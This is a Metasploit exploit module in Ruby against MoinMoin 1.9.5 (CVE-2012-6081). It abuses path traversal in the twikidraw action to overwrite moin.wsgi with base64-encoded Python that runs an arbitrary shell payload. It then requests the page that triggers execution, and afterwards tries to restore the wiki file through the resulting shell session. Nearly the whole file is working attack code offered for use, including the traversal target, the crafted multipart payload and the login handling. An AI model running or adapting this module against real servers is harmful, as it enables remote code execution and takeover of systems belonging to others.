##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ManualRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'MoinMoin twikidraw Action Traversal File Upload',
      'Description'    => %q{
          This module exploits a vulnerability in MoinMoin 1.9.5. The vulnerability
        exists on the manage of the twikidraw actions, where a traversal path can be used
        in order to upload arbitrary files. Exploitation is achieved on Apached/mod_wsgi
        configurations by overwriting moin.wsgi, which allows to execute arbitrary python
        code, as exploited in the wild on July, 2012. The user is warned to use this module
        at his own risk since it's going to overwrite the moin.wsgi file, required for the
        correct working of the MoinMoin wiki. While the exploit will try to restore the
        attacked application at post exploitation, correct working after all isn't granted.
      },
      'Author'         =>
        [
          'Unknown', # Vulnerability discovery
          'HTP', # PoC
          'juan vazquez' # Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2012-6081' ],
          [ 'OSVDB', '88825' ],
          [ 'BID', '57082' ],
          [ 'EDB', '25304' ],
          [ 'URL', 'http://hg.moinmo.in/moin/1.9/rev/7e7e1cbb9d3f' ],
          [ 'URL', 'http://wiki.python.org/moin/WikiAttack2013' ]
        ],
      'Privileged'     => false, # web server context
      'Payload'        =>
        {
          'DisableNops' => true,
          'Space'       => 16384, # Enough one to fit any payload
          'Compat'      =>
            {
              'PayloadType' => 'cmd',
              'RequiredCmd' => 'generic telnet netcat perl'
            }
        },
      'Platform'       => [ 'unix' ],
      'Arch'           => ARCH_CMD,
      'Targets'        => [[ 'MoinMoin 1.9.5', { }]],
      'DisclosureDate' => 'Dec 30 2012',
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('TARGETURI', [ true, "MoinMoin base path", "/" ]),
        OptString.new('WritablePage', [ true, "MoinMoin Page with edit permissions to inject the payload, by default WikiSandbox (Ex: /WikiSandbox)", "/WikiSandBox" ]),
        OptString.new('USERNAME', [ false,  "The user to authenticate as (anonymous if username not provided)"]),
        OptString.new('PASSWORD', [ false,  "The password to authenticate with (anonymous if password not provided)" ])
      ], self.class)
  end

  def moinmoin_template(path)
    template =[]
    template << "# -*- coding: iso-8859-1 -*-"
    template << "import sys, os"
    template << "sys.path.insert(0, 'PATH')".gsub(/PATH/, File.dirname(path))
    template << "from MoinMoin.web.serving import make_application"
    template << "application = make_application(shared=True)"
    return template
  end

  def restore_file(session, file, contents)
    first = true
    contents.each {|line|
      if first
        session.shell_command_token("echo \"#{line}\" > #{file}")
        first = false
      else
        session.shell_command_token("echo \"#{line}\" >> #{file}")
      end
    }
  end

  # Try to restore a basic moin.wsgi file with the hope of making the
  # application usable again.
  # Try to search on /usr/local/share/moin (default search path) and the
  # current path (apache user home). Avoiding to search on "/" because it
  # could took long time to finish.
  def on_new_session(session)
    print_status("Trying to restore moin.wsgi...")
    begin
      files = session.shell_command_token("find `pwd` -name moin.wsgi 2> /dev/null")
      files.split.each { |file|
        print_status("#{file} found! Trying to restore...")
        restore_file(session, file, moinmoin_template(file))
      }

      files = session.shell_command_token("find /usr/local/share/moin -name moin.wsgi 2> /dev/null")
      files.split.each { |file|
        print_status("#{file} found! Trying to restore...")
        restore_file(session, file, moinmoin_template(file))
      }
      print_warning("Finished. If application isn't usable, manual restore of the moin.wsgi file would be required.")
    rescue
      print_warning("Error while restring moin.wsgi, manual restoring would be required.")
    end
  end

  def do_login(username, password)
    res = send_request_cgi({
      'method'   => 'POST',
      'uri'      => normalize_uri(@base, @page),
      'vars_post' =>
        {
          'action' => 'login',
          'name' => username,
          'password' => password,
          'login' => 'Login'
        }
      })

    if not res or res.code != 200 or not res.headers.include?('Set-Cookie')
      return nil
    end

    return res.get_cookies

  end

  def upload_code(session, code)

    vprint_status("Retrieving the ticket...")

    res = send_request_cgi({
      'uri'      => normalize_uri(@base, @page),
      'cookie'   => session,
      'vars_get' => {
        'action' => 'twikidraw',
        'do'     => 'modify',
        'target' => '../../../../moin.wsgi'
      }
    })

    if not res or res.code != 200 or res.body !~ /ticket=(.*?)&target/
      vprint_error("Error retrieving the ticket")
      return nil
    end

    ticket = $1
    vprint_good("Ticket found: #{ticket}")

    my_payload = "[MARK]#{code}[MARK]"
    post_data = Rex::MIME::Message.new
    post_data.add_part("drawing.r if()else[]\nexec eval(\"open(__file__)\\56read()\\56split('[MARK]')[-2]\\56strip('\\\\0')\")", nil, nil, "form-data; name=\"filename\"")
    post_data.add_part(my_payload, "image/png", nil, "form-data; name=\"filepath\"; filename=\"drawing.png\"")
    my_data = post_data.to_s.gsub(/^\r\n\-\-\_Part\_/, '--_Part_')

    res = send_request_cgi({
      'method'   => 'POST',
      'uri'      => normalize_uri(@base, @page),
      'cookie'   => session,
      'vars_get' =>
      {
        'action' => 'twikidraw',
        'do'     => 'save',
        'ticket' => ticket,
        'target' => '../../../../moin.wsgi'
      },
      'data'     => my_data,
      'ctype'    => "multipart/form-data; boundary=#{post_data.bound}"
    })

    if not res or res.code != 200 or not res.body.empty?
      vprint_error("Error uploading the payload")
      return nil
    end

    return true
  end

  def check
    @base = target_uri.path
    @base << '/' if @base[-1, 1] != '/'

    res = send_request_cgi({
      'uri' => normalize_uri(@base)
    })

    if res and res.code == 200 and res.body =~ /moinmoin/i and res.headers['Server'] =~ /Apache/
      return Exploit::CheckCode::Detected
    elsif res
      return Exploit::CheckCode::Unknown
    end

    return Exploit::CheckCode::Safe
  end

  def writable_page?(session)

    res = send_request_cgi({
      'uri' => normalize_uri(@base, @page),
      'cookie' => session,
    })

    if not res or res.code != 200 or res.body !~ /Edit \(Text\)/
      return false
    end

    return true
  end


  def exploit

    # Init variables
    @page = datastore['WritablePage']

    @base = target_uri.path
    @base << '/' if @base[-1, 1] != '/'

    # Login if needed
    if (datastore['USERNAME'] and
      not datastore['USERNAME'].empty? and
      datastore['PASSWORD'] and
      not datastore['PASSWORD'].empty?)
      print_status("Trying login to get session ID...")
      session = do_login(datastore['USERNAME'], datastore['PASSWORD'])
    else
      print_status("Using anonymous access...")
      session = ""
    end

    # Check authentication
    if not session
      fail_with(Exploit::Failure::NoAccess, "Error getting a session ID, check credentials or WritablePage option")
    end

    # Check writable permissions
    if not writable_page?(session)
      fail_with(Exploit::Failure::NoAccess, "There are no write permissions on #{@page}")
    end

    # Upload payload
    print_status("Trying to upload payload...")
    python_cmd = "import os\nos.system(\"#{Rex::Text.encode_base64(payload.encoded)}\".decode(\"base64\"))"
    res = upload_code(session, "exec('#{Rex::Text.encode_base64(python_cmd)}'.decode('base64'))")
    if not res
      fail_with(Exploit::Failure::Unknown, "Error uploading the payload")
    end

    # Execute payload
    print_status("Executing the payload...")
    res = send_request_cgi({
      'uri'      => normalize_uri(@base, @page),
      'cookie' => session,
      'vars_get' => {
        'action' => 'AttachFile'
      }
    }, 5)

  end

end
